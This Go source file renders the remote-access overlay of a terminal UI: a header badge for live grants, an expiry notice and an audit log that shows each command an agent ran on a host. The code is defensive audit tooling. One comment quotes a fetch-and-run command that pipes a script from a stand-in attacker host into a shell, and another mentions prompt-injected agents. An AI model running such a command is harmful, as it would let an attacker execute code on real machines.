package ui

import (
	"strings"
	"time"

	"github.com/Janne6565/wharf-tui/internal/remoteaccess"
	"github.com/Janne6565/wharf-tui/internal/theme"
	"github.com/charmbracelet/lipgloss"
)

// remoteAccessChip renders the header badge for a live grant, next to the
// forwards chip, in whatever width is left for it. Empty in demo mode and
// whenever no grant is outstanding.
//
// It is a filled badge rather than a dim glyph, and it names the host where
// there is room, because it is not a status: it is the standing indication that
// some other process can run commands on a real machine right now. A user who
// has forgotten that is exactly who this is for.
//
// It degrades in two steps — host name dropped, then down to a bare marker —
// because barLine drops the *entire* right-hand cluster when it overflows. A
// chip that insisted on its full width would, at the common 80 columns, take
// the vault indicator and the lock hint down with it and leave the one warning
// that matters invisible precisely when a grant is live.
//
// The role is t.Warn — t.Blue belongs to the forwards chip and t.Ok/t.Err to
// the sync dot, so a shared colour would make three different facts look alike.
// Roles, never literal colours, so a live theme switch recolours it.
func (m Model) remoteAccessChip(t theme.Theme, room int) string {
	g := m.raGrant()
	if m.demo || g == nil {
		return ""
	}
	sep := stl(t.Dim, t.Bg).Render(" · ")
	for _, label := range []string{" ⚡ remote " + g.HostName() + " ", " ⚡ remote ", " ⚡ "} {
		if lipgloss.Width(sep)+lipgloss.Width(label) <= room {
			return sep + bold(t.Ink, t.Warn).Render(label)
		}
	}
	// Nothing fits at all: better to lose the chip than the whole cluster.
	return ""
}

// headerRoom is how many cells of the header bar are still free once the pieces
// already committed to it are laid out. The two spare cells are the one-cell
// margin barLine is given on each side.
func (m Model) headerRoom(parts ...string) int {
	room := m.w - 2
	for _, s := range parts {
		room -= lipgloss.Width(s)
	}
	return room
}

// --- overlay ----------------------------------------------------------------

// remoteAccessView renders the grant overlay (A): the command line, what it
// costs, when it dies, and every command it has run.
func (m Model) remoteAccessView(t theme.Theme) []string {
	g := m.raGrant()
	var body []string
	if g == nil {
		// A grant that ended under the reader's nose says so here, because the
		// toast that announced it is in the status bar and this panel is drawn
		// over the status bar. Without it the header simply stops claiming a
		// grant, which reads as a glitch rather than as an expiry.
		if m.raEnded != "" {
			body = append(body, stl(t.Warn, t.Panel).Render(m.raEnded), "")
		}
		body = append(body,
			stl(t.Dim, t.Panel).Render("no remote access granted"),
			"",
			stl(t.Dim, t.Panel).Render("press ")+stl(t.Hi, t.Panel).Render("r")+
				stl(t.Dim, t.Panel).Render(" on a connected host to let one local process"),
			stl(t.Dim, t.Panel).Render("run commands on it — no key, no password, revocable here."))
		if m.raErr != "" {
			body = append(body, "", stl(t.Err, t.Panel).Render(m.raErr))
		}
		body = append(body, m.remoteAccessLog(t)...)
		return m.remoteAccessBox(t, append(body, "", m.remoteAccessLegend(t)))
	}

	copied, copyErr := m.raCopy.forGrant(g)
	body = append(body,
		stl(t.Dim, t.Panel).Render("granted on ")+stl(t.Hi, t.Panel).Render(g.HostName())+
			stl(t.Dim, t.Panel).Render(" · exec only · no pty"),
		"")
	// The command line is always rendered in full, as plain selectable text, and
	// the panel is sized around it (see remoteAccessPanelW). OSC 52 reaches
	// nobody when stderr is not a terminal and is silently dropped by some
	// terminals that are, so selecting this line is not a nicety — it is the
	// normal way a good share of users will get the command.
	for _, l := range wrapText(g.CommandLine(), m.remoteAccessWidth()) {
		body = append(body, stl(t.Hi, t.Panel).Render(l))
	}
	body = append(body, "")
	if copied {
		// Deliberately "sent", not "copied": the write succeeding is the whole of
		// what is knowable. A terminal that refuses clipboard writes — iTerm2's
		// default — swallows the sequence without a word, and the line above is
		// what the user falls back to.
		body = append(body, stl(t.Ok, t.Panel).Render("✓ sent to the clipboard (OSC 52)"))
	} else {
		// Never claim a copy that did not happen — and say both why and what to
		// do instead, since "not copied" on its own reads as a bug. A grant this
		// process has no copy record for — one minted in-session by a build that
		// somehow lost the record, or one that replaced the recorded grant —
		// reads the same way, which is the only honest answer available.
		note := "! not copied"
		if copyErr != "" {
			note += " (" + copyErr + ")"
		}
		body = append(body, stl(t.Warn, t.Panel).Render(note+" — select the line above"))
	}
	body = append(body,
		stl(t.Dim, t.Panel).Render("expires ")+stl(t.Warn, t.Panel).Render(humanizeIn(g.ExpiresAt()))+
			stl(t.Dim, t.Panel).Render(" · "+plural(g.Count(), "command")+" run"))
	if m.raErr != "" {
		body = append(body, "", stl(t.Err, t.Panel).Render(m.raErr))
	}
	body = append(body, m.remoteAccessLog(t)...)
	return m.remoteAccessBox(t, append(body, "", m.remoteAccessLegend(t)))
}

// remoteAccessMinPanelW is the overlay's floor width, matching the shared
// modalBox so the panel never looks cramped next to the other overlays.
const remoteAccessMinPanelW = 66

// remoteAccessPanelW is the overlay's outer width. Alone among the modals it
// sizes itself, from the command line it has to show: the token's length is
// remoteaccess's business and has already changed once (base64 → base32), and a
// constant tuned to yesterday's token silently turns the fallback for terminals
// without a working clipboard into a wrapped line nobody can select in one go.
func (m Model) remoteAccessPanelW() int {
	pw := remoteAccessMinPanelW
	if g := m.raGrant(); g != nil {
		// +2 borders, +padX either side: what boxContentW subtracts back out.
		if want := len([]rune(g.CommandLine())) + 2 + 2*padX; want > pw {
			pw = want
		}
	}
	if pw > m.w-6 {
		pw = m.w - 6
	}
	return pw
}

// remoteAccessBox renders the overlay panel at that width.
func (m Model) remoteAccessBox(t theme.Theme, body []string) []string {
	box := boxPanelAuto(t, "remote access", t.Hi, m.remoteAccessPanelW(), body)
	return centerInArea(box, m.w, m.h, t.Bg)
}

// remoteAccessWidth is the usable content width inside that panel — what the
// command line and the log rows are wrapped to.
func (m Model) remoteAccessWidth() int { return boxContentW(m.remoteAccessPanelW()) }

// raRowIndent is the width of a log row's fixed left column: two cells of
// cursor, nine of timestamp, nine of status.
const raRowIndent = 2 + 9 + 9

// remoteAccessLog renders the live command log, most recent first. It is not
// decoration: it is the only thing standing between a prompt-injected agent and
// a user who never finds out what ran.
func (m Model) remoteAccessLog(t theme.Theme) []string {
	// Read straight from the Holder, every frame. That is what replaces phase
	// 1's queue: an event cannot be lost on its way here, because nothing is on
	// its way here — the log is the Holder's, and this only looks at it.
	log := m.raLog()
	out := []string{"", stl(t.Dim, t.Panel).Render("commands")}
	if len(log) == 0 {
		return append(out, stl(t.Dim, t.Panel).Render("  nothing has run yet"))
	}
	idx := raCursor(log, m.raSel)
	// The host the *live* grant is on. Rows from any other host are tagged with
	// theirs; rows from this one are not, because tagging every row with the
	// host named two lines above it is noise that trains people to stop reading
	// the tag. With no grant live, this is "" and every row is tagged — which is
	// right: at that moment nothing on screen says which machine any of it ran
	// on.
	live := ""
	if g := m.raGrant(); g != nil {
		live = g.HostID()
	}
	for i, e := range log {
		out = append(out, m.remoteAccessRows(t, e, live, i == idx)...)
	}
	return out
}

// raCursor resolves the selected entry to a row index.
//
// The cursor is kept as an Entry.ID rather than an index because the log grows
// at the *front*: while an agent is running commands, every new row pushes the
// old ones down, and an index-keyed cursor would slide onto a different command
// between one frame and the next. In an audit UI that is not cosmetic — the row
// a user is reading, and about to revoke over, must stay the row they selected.
// Entry.ID exists for exactly this (holder.go:96-98).
//
// An id that is no longer in the log — its row aged off the end, or the cursor
// was never moved — resolves to the newest row, which is where the overlay
// opens anyway.
func raCursor(log []remoteaccess.Entry, sel uint64) int {
	for i, e := range log {
		if e.ID == sel {
			return i
		}
	}
	return 0
}

// remoteAccessRows renders one audited command: cursor, time, outcome, and the
// command itself wrapped over as many lines as it takes.
//
// The command is wrapped rather than truncated, and it is the *unwrapped* form
// that is shown. Truncating it to a column was worse than useless: every
// command the client sends begins with the same 29-character `exec "${SHELL…}"
// -lc ` preamble, so a truncated row showed the preamble and four characters of
// payload — `curl -sS http://attacker.example/x | sh` and `uptime` rendered
// identically, and the URL, which is the entire thing an audit log exists to
// surface, appeared nowhere at all.
func (m Model) remoteAccessRows(t theme.Theme, e remoteaccess.Entry, liveHostID string, sel bool) []string {
	mark := "  "
	cmdFg := t.Fg
	if sel {
		mark = "▸ "
		cmdFg = t.Hi
	}
	status, statusFg := "running", t.Warn
	switch {
	case e.Refused:
		// A refusal never reached the host, and saying "error" would suggest it
		// did. A burst of these is the shape a prompt-injected agent makes when
		// it keeps trying after being cut off, so the log has to be able to show
		// it as its own thing.
		status, statusFg = "refused", t.Err
	case e.Err != "":
		status, statusFg = "error", t.Err
	case e.Finished && e.Code == 0:
		status, statusFg = "exit 0", t.Ok
	case e.Finished:
		status, statusFg = "exit "+itoa(e.Code), t.Err
	}

	avail := m.remoteAccessWidth() - raRowIndent
	if avail < 8 {
		avail = 8
	}
	// The host goes into the wrapped text rather than into a column of its own,
	// so a long name costs a wrap instead of squeezing the command; and it is
	// carried by the words, not by a colour, because these rows are read in
	// screenshots and bug reports as often as on a screen.
	//
	// A row that did not say which host it belonged to would be actively
	// misleading precisely when it matters most: the log deliberately survives a
	// grant, and the in-session hotkey *replaces* grants as its normal
	// behaviour, so "granted on db1" over a row that ran on web1 is the routine
	// case, not the corner one. Clearing the log on a new grant would also fix
	// the mismatch, and was rejected outright — it would hand anyone who can
	// mint a grant a way to erase the record of what the last one did.
	label := ""
	if e.HostName != "" && e.HostID != liveHostID {
		label = "on " + e.HostName + " · "
	}
	lines := wrapText(label+displayCommand(e.Command), avail)
	if len(lines) == 0 {
		lines = []string{""}
	}
	out := []string{
		stl(t.Hi, t.Panel).Render(mark) +
			stl(t.Dim, t.Panel).Render(padTo2(e.At.Format("15:04:05"), 9)) +
			stl(statusFg, t.Panel).Render(padTo2(status, 9)) +
			stl(cmdFg, t.Panel).Render(lines[0]),
	}
	for _, l := range lines[1:] {
		out = append(out, stl(t.Dim, t.Panel).Render(strings.Repeat(" ", raRowIndent))+
			stl(cmdFg, t.Panel).Render(l))
	}
	// The error text goes on its own line rather than into the status column: it
	// is the one field with no length bound, and squeezing it into a column is
	// how it would end up truncated to "conn…".
	if e.Err != "" {
		for _, l := range wrapText(e.Err, avail) {
			out = append(out, stl(t.Dim, t.Panel).Render(strings.Repeat(" ", raRowIndent))+
				stl(t.Err, t.Panel).Render(l))
		}
	}
	return out
}

// raWrapperPrefix is the invocation cmd/wharf wraps every remote command in
// (`exec "${SHELL:-/bin/sh}" -lc '<script>'`, see remoteCommand there).
//
// It is duplicated here rather than exported from cmd/wharf, which a library
// package cannot import at all, and rather than shipped alongside the Event,
// which would put a presentation concern into the audit record. The duplication
// is safe because it is used for display only and fails soft: a command that
// does not match the pattern — a future wrapper, or one from another client —
// is shown verbatim, which is exactly what the audit log promises anyway.
const raWrapperPrefix = `exec "${SHELL:-/bin/sh}" -lc `

// displayCommand unwraps a command for the audit log: the login-shell preamble
// is stripped and the single layer of shell quoting cmd/wharf added is undone,
// so the row shows what the agent actually asked for.
func displayCommand(cmd string) string {
	rest, ok := strings.CutPrefix(cmd, raWrapperPrefix)
	if !ok {
		return cmd
	}
	if len(rest) >= 2 && strings.HasPrefix(rest, "'") && strings.HasSuffix(rest, "'") {
		rest = strings.ReplaceAll(rest[1:len(rest)-1], `'\''`, "'")
	}
	if rest == "" {
		return cmd
	}
	return rest
}

// remoteAccessLegend is the overlay's key legend, matching the forwards
// overlay's.
func (m Model) remoteAccessLegend(t theme.Theme) string {
	return stl(t.Hi, t.Panel).Render("j/k") + stl(t.Dim, t.Panel).Render(" move · ") +
		stl(t.Hi, t.Panel).Render("c") + stl(t.Dim, t.Panel).Render(" copy · ") +
		stl(t.Hi, t.Panel).Render("x") + stl(t.Dim, t.Panel).Render(" revoke · ") +
		stl(t.Hi, t.Panel).Render("esc") + stl(t.Dim, t.Panel).Render(" close overlay")
}

// humanizeIn renders how long until t, in the register of humanizeAgo. An
// already-passed deadline reads "now" rather than a negative duration: a grant
// at its expiry is being revoked this frame anyway.
func humanizeIn(at time.Time) string {
	d := time.Until(at)
	switch {
	case d <= 0:
		return "now"
	case d < time.Minute:
		return "in " + itoa(int(d.Seconds())) + "s"
	case d < time.Hour:
		return "in " + itoa(int(d.Minutes())) + "m"
	default:
		return "in " + itoa(int(d.Hours())) + "h" + itoa(int(d.Minutes())%60) + "m"
	}
}
